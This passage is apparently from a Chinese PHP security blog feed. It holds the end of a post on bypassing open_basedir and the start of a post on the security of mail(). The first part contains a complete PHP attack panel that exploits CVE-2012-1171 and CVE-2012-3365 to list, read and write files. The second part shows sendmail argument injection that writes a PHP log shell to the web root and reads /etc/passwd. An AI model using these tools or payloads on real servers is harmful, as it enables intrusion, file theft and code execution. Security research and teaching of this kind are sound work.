<span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant class for DOMFileWriter &amp; DOMFileReader</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamExploiter</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $mode, $filePath, $fileContent;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stream_close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$doc = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$doc-&gt;strictErrorChecking = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;mode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">$doc-&gt;loadHTML(<span class="keyword">$this</span>-&gt;fileContent);</span><br><span class="line">$doc-&gt;removeChild($doc-&gt;firstChild);</span><br><span class="line">$doc-&gt;saveHTMLFile(<span class="keyword">$this</span>-&gt;filePath);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">$doc-&gt;resolveExternals = <span class="keyword">true</span>;</span><br><span class="line">$doc-&gt;substituteEntities = <span class="keyword">true</span>;</span><br><span class="line">$doc-&gt;loadXML(<span class="string">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \"file://&#123;$this-&gt;filePath&#125;\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span>, LIBXML_PARSEHUGE);</span><br><span class="line"><span class="keyword">echo</span> $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = substr($path, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;mode = $mode;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fileContent = $data;</span><br><span class="line"><span class="keyword">return</span> strlen($data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line"><span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line"><span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'w'</span>);</span><br><span class="line">fwrite($_DOM_exploit_resource, $content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileReader</span> <span class="keyword">extends</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line"><span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'r'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqliteFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> is_writable(getcwd())</span><br><span class="line">&amp;&amp; (extension_loaded(<span class="string">'sqlite3'</span>) || extension_loaded(<span class="string">'sqlite'</span>))</span><br><span class="line">&amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.15'</span>, <span class="string">'&lt;='</span>) || (version_compare(phpversion(), <span class="string">'5.4.5'</span>, <span class="string">'&lt;='</span>) &amp;&amp; PHP_MINOR_VERSION == <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">$sqlite_class = extension_loaded(<span class="string">'sqlite3'</span>) ? <span class="string">'sqlite3'</span> : <span class="string">'SQLiteDatabase'</span>;</span><br><span class="line">mkdir(<span class="string">':memory:'</span>);</span><br><span class="line">$payload_path = getRelativePath(getcwd() . <span class="string">'/:memory:'</span>, <span class="keyword">$this</span>-&gt;getFilePath());</span><br><span class="line">$payload = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, $content);</span><br><span class="line">$database = <span class="keyword">new</span> $sqlite_class(<span class="string">":memory:/&#123;$payload_path&#125;"</span>);</span><br><span class="line">$database-&gt;exec(<span class="string">"CREATE TABLE foo (bar STRING)"</span>);</span><br><span class="line">$database-&gt;exec(<span class="string">"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')"</span>);</span><br><span class="line">$database-&gt;close();</span><br><span class="line">rmdir(<span class="string">':memory:'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// End of Core</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">''</span>;</span><br><span class="line">$cwd = <span class="keyword">isset</span>($_GET[<span class="string">'cwd'</span>]) ? $_GET[<span class="string">'cwd'</span>] : getcwd();</span><br><span class="line">$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">$directorLister = fallback(<span class="keyword">array</span>(<span class="string">'GlobWrapperDirectoryLister'</span>, <span class="string">'RealpathBruteForceDirectoryLister'</span>));</span><br><span class="line">$fileWriter = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileWriter'</span>, <span class="string">'SqliteFileWriter'</span>));</span><br><span class="line">$fileReader = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileReader'</span>));</span><br><span class="line">$append = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#panel &#123;</span></span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#panel &gt; pre &#123;</span></span><br><span class="line">  margin: <span class="number">0</span>;</span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=<span class="string">"panel"</span>&gt;</span><br><span class="line">&lt;pre id=<span class="string">"dl"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=<span class="string">"cwd"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $cwd; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (get_class($directorLister) === <span class="string">'RealpathBruteForceDirectoryLister'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$characters = <span class="keyword">isset</span>($_GET[<span class="string">'characters'</span>]) ? $_GET[<span class="string">'characters'</span>] : $directorLister-&gt;characters;</span><br><span class="line">$maxlength = <span class="keyword">isset</span>($_GET[<span class="string">'maxlength'</span>]) ? $_GET[<span class="string">'maxlength'</span>] : $directorLister-&gt;maxlength;</span><br><span class="line">$append = <span class="string">"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">$directorLister-&gt;setMaxlength($maxlength);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Search Characters: &lt;input name=<span class="string">"characters"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $characters; ?&gt;"</span>&gt;</span><br><span class="line">Maxlength of File: &lt;input name=<span class="string">"maxlength"</span> size=<span class="string">"1"</span> value=<span class="string">"&lt;?php echo $maxlength; ?&gt;"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br><span class="line">Description      : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $directorLister-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="keyword">isset</span>($_GET[<span class="string">'file_path'</span>]) ? $_GET[<span class="string">'file_path'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;pre id=<span class="string">"rf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Read"</span>&gt;</span><br><span class="line">Description: &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileReader-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"rf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;pre id=<span class="string">"wf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path   : &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Write"</span>&gt;</span><br><span class="line">File Content: &lt;textarea cols=<span class="string">"70"</span> name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">Description : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileWriter-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"wf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=<span class="string">"#dl"</span>&gt;Directory Listing&lt;/a&gt; | &lt;a href=<span class="string">"#rf"</span>&gt;Read File&lt;/a&gt; | &lt;a href=<span class="string">"#wf"</span>&gt;Write File&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($action === <span class="string">'rf'</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fileReader-&gt;setFilePath($file_path);</span><br><span class="line"><span class="keyword">echo</span> $fileReader-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span> ($action === <span class="string">'wf'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">$fileWriter-&gt;setFilePath($file_path);</span><br><span class="line">$fileWriter-&gt;write($_GET[<span class="string">'content'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'The file should be written.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Something goes wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">&lt;ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directorLister-&gt;setCurrentPath($cwd);</span><br><span class="line">$file_list = $directorLister-&gt;getFileList();</span><br><span class="line">$parent_path = dirname($cwd);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (count($file_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $file) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No files found. The path is probably not a directory.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>试了下，简单的界面化了，但局限性非常明显，就是glob://伪协议的局限性：</p><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/12.png" alt=""></p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p><a href="http://ju.outofmemory.cn/entry/104785" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.jianshu.com/p/98535e6c54df" target="_blank" rel="noopener">通过chdir来bypass open_basedir</a></p><p><a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP中mail()函数安全问题与防御</title>
    <link href="https://www.mi1k7ea.com/2019/07/16/PHP%E4%B8%ADmail-%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>https://www.mi1k7ea.com/2019/07/16/PHP中mail-函数安全问题与防御/</id>
    <published>2019-07-16T14:23:52.000Z</published>
    <updated>2019-07-21T06:53:52.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-函数简介"><a href="#0x01-函数简介" class="headerlink" title="0x01 函数简介"></a>0x01 函数简介</h2><p>(PHP 4, PHP 5, PHP 7)</p><p>mail()函数允许您从脚本中直接发送电子邮件。如果邮件的投递被成功地接收，则返回 true，否则返回 false。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] ) : bool</span><br></pre></td></tr></table></figure><p>参数说明：</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">to</td><td style="text-align:left">必需。规定邮件的接收者。</td></tr><tr><td style="text-align:left">subject</td><td style="text-align:left">必需。规定邮件的主题。该参数不能包含任何换行字符。</td></tr><tr><td style="text-align:left">message</td><td style="text-align:left">必需。规定要发送的消息。</td></tr><tr><td style="text-align:left">additional_headers</td><td style="text-align:left">可选。规定额外的报头，比如 From, Cc 以及 Bcc。</td></tr><tr><td style="text-align:left">additional_parameters</td><td style="text-align:left">可选。规定 sendmail 程序的额外参数。</td></tr></tbody></table><p>在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p><p>发送一封简单的邮件的Demo代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$txt = <span class="string">"First line of text\nSecond line of text"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果一行大于 70 个字符，请使用 wordwrap()。</span></span><br><span class="line">$txt = wordwrap($txt,<span class="number">70</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送邮件</span></span><br><span class="line">mail(<span class="string">"somebody@example.com"</span>,<span class="string">"My subject"</span>,$txt);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-安全问题"><a href="#0x02-安全问题" class="headerlink" title="0x02 安全问题"></a>0x02 安全问题</h2><p>在PHP中，mail()函数无论是自身问题或者助攻其他漏洞方面都是出现很多它的身影的。</p><p>我们从参数开始说起，其实可以明显看到mail()函数的前三个必须的参数是不存在类似其他参数所存在的注入风险的，安全问题主要集中在后面两个参数。</p><h3 id="垃圾邮件发送"><a href="#垃圾邮件发送" class="headerlink" title="垃圾邮件发送"></a>垃圾邮件发送</h3><p>可控点：第一个参数to</p><p>要说在mail()函数的三个必须的参数中是否有安全风险，那就是第一个参数即to。</p><p>当to参数可由用户从外部输入来控制时，攻击者就可以利用to参数来设定受害者的邮箱来不断地发送垃圾邮件。对服务端本身危害不大，但值得注意。</p><h3 id="邮件头注入"><a href="#邮件头注入" class="headerlink" title="邮件头注入"></a>邮件头注入</h3><p>可控点：第四个参数additional_headers</p><p>前提条件：PHP 5.4.42 和 5.5.27 之前</p><p>我们知道additional_headers参数是用于添加额外的报头，由于邮件标题由CRLF换行符\r\n来分隔的，因此当未初始化第四个参数时，攻击者可以使用这些字符来附加其他电子邮件标题。此攻击称为电子邮件头注入（或短电子邮件注入）。通过向注入CC:或BCC:标头添加多个电子邮件地址来发送多个垃圾邮件可能会被滥用。</p><p>具体email头注入的示例可参考：<a href="https://resources.infosecinstitute.com/email-injection/" target="_blank" rel="noopener">PHP Email Injection Example [Updated 2018]</a></p><h3 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h3><p>可控点：第五个参数additional_parameters</p><p>我们知道，mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p><p>sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种：</p><blockquote><ol><li><p>-O option = value<br>QueueDirectory = queuedir 选择队列消息</p></li><li><p>-X logfile<br>这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</p></li><li><p>-f from email<br>这个参数可以让我们指定我们发送邮件的邮箱地址。</p></li><li><p>-C file</p><p>这个参数用File变量指定的备用配置文件启动sendmail命令。</p></li></ol></blockquote><h4 id="利用1——向Web目录写日志shell"><a href="#利用1——向Web目录写日志shell" class="headerlink" title="利用1——向Web目录写日志shell"></a>利用1——向Web目录写日志shell</h4><p>主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">"mi1k@7ea.com"</span>;</span><br><span class="line">$subject = <span class="string">"hhhhhh"</span>;</span><br><span class="line">$message = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$headers = <span class="string">"CC: alan@7ea.com"</span>;</span><br><span class="line">$options = <span class="string">"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/1.png" alt=""></p><p>直接访问log-shell.php即可触发代码执行：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/2.png" alt=""></p><h4 id="利用2——读取任意文件内容"><a href="#利用2——读取任意文件内容" class="headerlink" title="利用2——读取任意文件内容"></a>利用2——读取任意文件内容</h4><p>看个参数注入原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">system(<span class="string">"/usr/sbin/sendmail -t -i -f"</span>.escapeshellcmd($_GET[c]).<span class="string">' &lt; mail.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用-C参数选项读取任意文件内容，输入<a href="mailto:payload`a@b.com" target="_blank" rel="noopener">payload`a@b.com</a> -C/etc/passwd -X/tmp/output.txt`：</p><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/3.png" alt=""></p><h3 id="escapeshellarg-逃逸"><a href="#escapeshellarg-逃逸" class="headerlink" title="escapeshellarg()逃逸"></a>escapeshellarg()逃逸</h3><p>对于第五个参数addiional_parameters外部可控即存在参数注入的问题，有小伙伴会通过调用escapeshellarg()来对addiional_parameters参数进行过滤，但是由于在mail()函数的源码中是会调用escapeshellcmd()函数来过滤addiional_parameters参数的，从而导致了escapeshellarg&gt;escapeshellcmd参数注入，逃逸了escapeshellarg()的过滤。</p><p>具体原理和Demo参考：<a href="https://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/">《浅谈escapeshellarg逃逸与参数注入》</a></p><p>受该漏洞影响的一些扩展应用组件信息如下表：</p><table><thead><tr><th>Application</th><th>Version</th><th>Reference</th></tr></thead><tbody><tr><td>Roundcube</td><td>&lt;= 1.2.2</td><td><a href="https://blog.ripstech.com/2016/roundcube-command-execution-via-email/" target="_blank" rel="noopener">CVE-2016-9920</a></td></tr><tr><td>MediaWiki</td><td>&lt; 1.29</td><td><a href="https://phabricator.wikimedia.org/T152717" target="_blank" rel="noopener">Discussion</a></td></tr><tr><td>PHPMailer</td><td>&lt;= 5.2.18</td><td><a href="https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities" target="_blank" rel="noopener">CVE-2016-10033</a></td></tr><tr><td>Zend Framework</td><td>&lt; 2.4.11</td><td><a href="https://framework.zend.com/security/advisory/ZF2016-04" target="_blank" rel="noopener">CVE-2016-10034</a></td></tr><tr><td>SwiftMailer</td><td>&lt;= 5.4.5-DEV</td><td><a href="https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html" target="_blank" rel="noopener">CVE-2016-10074</a></td></tr><tr><td>SquirrelMail</td><td>&lt;= 1.4.23</td><td><a href="https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html" target="_blank" rel="noopener">CVE-2017-7692</a></td></tr></tbody></table><h3 id="不安全的FILTER-VALIDATE-EMAIL"><a href="#不安全的FILTER-VALIDATE-EMAIL" class="headerlink" 